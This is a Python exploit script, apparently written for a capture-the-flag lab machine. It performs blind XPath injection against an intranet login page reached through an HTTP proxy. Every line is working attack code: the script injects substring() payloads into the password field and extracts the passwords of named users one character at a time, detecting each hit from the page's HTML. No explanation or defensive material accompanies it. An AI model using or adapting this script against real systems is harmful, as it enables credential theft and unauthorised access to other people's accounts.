#!/usr/bin/python3 

import requests, re
from pwn import *

intranet_url = "http://172.31.179.1/intranet.php"
proxy = {"http" : "http://10.10.10.200:3128"}

try:
    p1 = log.progress("XPath exploit")

    axyz = "abcdefghijklmnopqrstuvwxyz0123456789!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    username = "anY0ne"
    users_array = ["rita", "jim", "bryan", "sarah"]
    letter_found = ""

    for name in users_array:

        p2 = log.progress("Username")
        p2.status("%s = " % (name))
        length_name = len(name)

        for col in range(1, 25):
            for letter_array in axyz:
                password = "' or substring(Username,1,%d)='%s' and substring(Password,%d,1)='%s' or '" % (length_name, name, col, letter_array)
                p1.status("%s" % (password))

                data_post = {
                    "Username" : username,
                    "Password" : password
                }

                req = requests.post(intranet_url, data=data_post, proxies=proxy, timeout=10)
                
                try:
                    juicy = re.findall(r'<div class="w3-row-padding w3-grayscale"><div class="w3-col m4 w3-margin-bottom"><div class="w3-light-grey"><p class=\'w3-opacity\'>(.*)', req.text)
                    if juicy:
                        im_in = 0
                        letter_found += letter_array
                        p2.status("%s = %s" % (name, letter_found))
                        break

                except:
                    p2.failure("The ju1cy failed :(")

        p2.success("%s = %s" % (name, letter_found))
        letter_found = ""

    p1.success("w3 4r3 d0n3 (:")

except requests.exceptions.ReadTimeout:
    p2.failure("t1m3:(0ut")
